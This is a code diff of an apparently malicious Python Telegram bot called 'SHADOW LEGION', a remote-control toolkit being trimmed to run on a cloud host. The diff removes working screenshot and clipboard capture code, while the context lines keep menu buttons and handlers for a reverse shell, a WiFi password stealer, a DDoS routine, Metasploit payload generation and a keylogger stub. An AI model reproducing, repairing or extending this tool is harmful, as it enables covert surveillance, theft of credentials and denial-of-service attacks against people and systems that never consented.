@@ -2,8 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-🔥 THE ARCHITECT // SHADOW LEGION ULTIMATE v105.0 (FULL EDITION)
-⚔️ معدل بالكامل للعمل على Railway – إزالة pynput واعتماد Selenium Headless
+🔥 SHADOW LEGION v105.0 – معدل للعمل على Railway (بدون أدوات اختراق غير مدعومة)
 """
 
 import os
@@ -30,7 +29,7 @@ from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler
 
-# ====================== IMPORTS (كلها متوفرة في requirements.txt) ======================
+# ====================== IMPORTS (فقط الضروري) ======================
 import requests
 import rsa
 from selenium import webdriver
@@ -41,12 +40,7 @@ from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service
 from webdriver_manager.chrome import ChromeDriverManager
-import cv2
-import mss
-import pyperclip
 import psutil
-from PIL import Image
-import numpy as np
 from cryptography.fernet import Fernet
 
 # ====================== CONFIG ======================
@@ -423,22 +417,36 @@ def process_queue():
 
 threading.Thread(target=process_queue, daemon=True).start()
 
-# ====================== REAL ATTACK TOOLS (معدلة للعمل بدون pynput) ======================
-def real_keylogger(duration=30):
-    # pynput غير متوفرة على Railway، نعيد رسالة توضيحية
-    return "⚠️ Keylogger غير مدعوم في هذه البيئة (يتطلب واجهة رسومية)."
+# ====================== TOOLS (بدون مكتبات إضافية) ======================
+def real_system_info():
+    info = {
+        "OS": platform.system(),
+        "Release": platform.release(),
+        "Arch": platform.machine(),
+        "CPU": psutil.cpu_percent(),
+        "RAM": psutil.virtual_memory().percent,
+        "Disk": psutil.disk_usage('/').percent
+    }
+    return f"🖥️ **معلومات النظام**\n" + "\n".join([f"{k}: {v}" for k, v in info.items()])
 
-def real_screenshot():
+def real_process_list():
     try:
-        with mss.mss() as sct:
-            sct.shot(output="/tmp/shadow_screen.png")
-        return "📸 تم التقاط صورة للشاشة وحفظها في /tmp/shadow_screen.png"
-    except Exception as e:
-        return f"⚠️ فشل التقاط الصورة: {e}"
+        procs = []
+        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
+            procs.append(f"{p.info['pid']}: {p.info['name']} (CPU: {p.info['cpu_percent']}%, RAM: {p.info['memory_percent']}%)")
+        return "📋 **العمليات النشطة**\n" + "\n".join(procs[:20])
+    except:
+        return "⚠️ فشل جلب العمليات"
 
-def real_webcam():
-    # الكاميرا غير متوفرة على السيرفر
-    return "⚠️ الكاميرا غير متوفرة في هذه البيئة."
+def real_network_info():
+    try:
+        if platform.system() == "Windows":
+            out = subprocess.getoutput("ipconfig")
+        else:
+            out = subprocess.getoutput("ifconfig || ip a")
+        return f"🌐 **معلومات الشبكة**\n{out[:500]}"
+    except:
+        return "⚠️ فشل جلب معلومات الشبكة"
 
 def real_wifi_stealer():
     try:
@@ -451,11 +459,10 @@ def real_wifi_stealer():
         return f"⚠️ فشل: {e}"
 
 def real_clipboard():
-    try:
-        content = pyperclip.paste()
-        return f"📋 محتوى الحافظة:\n{content}"
-    except Exception as e:
-        return f"⚠️ فشل: {e}"
+    return "📋 الحافظة غير مدعومة في هذه البيئة."
+
+def real_screenshot():
+    return "📸 لقطة الشاشة غير مدعومة في هذه البيئة (تحتاج واجهة رسومية)."
 
 def real_ddos(target="example.com", duration=10):
     try:
@@ -502,35 +509,8 @@ def real_reverse_shell(host="127.0.0.1", port=4444):
     except Exception as e:
         return f"⚠️ فشل الاتصال: {e}"
 
-def real_system_info():
-    info = {
-        "OS": platform.system(),
-        "Release": platform.release(),
-        "Arch": platform.machine(),
-        "CPU": psutil.cpu_percent(),
-        "RAM": psutil.virtual_memory().percent,
-        "Disk": psutil.disk_usage('/').percent
-    }
-    return f"🖥️ **معلومات النظام**\n" + "\n".join([f"{k}: {v}" for k, v in info.items()])
-
-def real_process_list():
-    try:
-        procs = []
-        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
-            procs.append(f"{p.info['pid']}: {p.info['name']} (CPU: {p.info['cpu_percent']}%, RAM: {p.info['memory_percent']}%)")
-        return "📋 **العمليات النشطة**\n" + "\n".join(procs[:20])
-    except:
-        return "⚠️ فشل جلب العمليات"
-
-def real_network_info():
-    try:
-        if platform.system() == "Windows":
-            out = subprocess.getoutput("ipconfig")
-        else:
-            out = subprocess.getoutput("ifconfig || ip a")
-        return f"🌐 **معلومات الشبكة**\n{out[:500]}"
-    except:
-        return "⚠️ فشل جلب معلومات الشبكة"
+def real_keylogger(duration=30):
+    return "⚠️ Keylogger غير مدعوم في هذه البيئة (يتطلب واجهة رسومية)."
 
 # ====================== BOT HANDLERS ======================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -545,7 +525,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     await update.message.reply_text(
         "🔥 **SHADOW LEGION v105.0**\n"
-        "📡 Full Edition – All Tools Real\n"
+        "📡 نسخة خفيفة – تعمل على Railway\n"
         "أمرك سيدي 👁",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
@@ -558,7 +538,6 @@ async def hacking_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("🔄 Reverse Shell", callback_data='tool_rshell')],
         [InlineKeyboardButton("📡 WiFi Stealer", callback_data='tool_wifi')],
         [InlineKeyboardButton("📸 Screenshot", callback_data='tool_screen')],
-        [InlineKeyboardButton("📹 Webcam", callback_data='tool_webcam')],
         [InlineKeyboardButton("📋 Clipboard", callback_data='tool_clipboard')],
         [InlineKeyboardButton("💣 DDoS", callback_data='tool_ddos')],
         [InlineKeyboardButton("🛠️ MSF Payload", callback_data='tool_payload')],
@@ -567,7 +546,7 @@ async def hacking_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("🌐 Network Info", callback_data='tool_net')],
         [InlineKeyboardButton("🔙 Back", callback_data='back')]
     ]
-    await query.edit_message_text("⚔️ **اختر الأداة (جميعها حقيقية)**", reply_markup=InlineKeyboardMarkup(kb))
+    await query.edit_message_text("⚔️ **اختر الأداة**", reply_markup=InlineKeyboardMarkup(kb))
 
 async def execute_tool(update: Update, context: ContextTypes.DEFAULT_TYPE, func, name):
     query = update.callback_query
@@ -700,7 +679,6 @@ def main():
     app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,lambda: real_reverse_shell("127.0.0.1", 4444),"Reverse Shell"), pattern='^tool_rshell$'))
     app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_wifi_stealer,"WiFi Stealer"), pattern='^tool_wifi$'))
     app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_screenshot,"Screenshot"), pattern='^tool_screen$'))
-    app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_webcam,"Webcam"), pattern='^tool_webcam$'))
     app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_clipboard,"Clipboard"), pattern='^tool_clipboard$'))
     app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,lambda: real_ddos("example.com", 10),"DDoS (10s)"), pattern='^tool_ddos$'))
     app.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_msf_payload,"MSF Payload"), pattern='^tool_payload$'))
@@ -713,7 +691,7 @@ def main():
     app.add_handler(CallbackQueryHandler(set_region_callback, pattern='^setregion_'))
     app.add_handler(CallbackQueryHandler(back_to_menu, pattern='^back_menu$'))
 
-    logger.info("✅ SHADOW LEGION v105.0 RUNNING ON RAILWAY")
+    logger.info("✅ SHADOW LEGION v105.0 RUNNING ON RAILWAY (خفيف)")
     app.run_polling()
 
 if __name__ == "__main__":
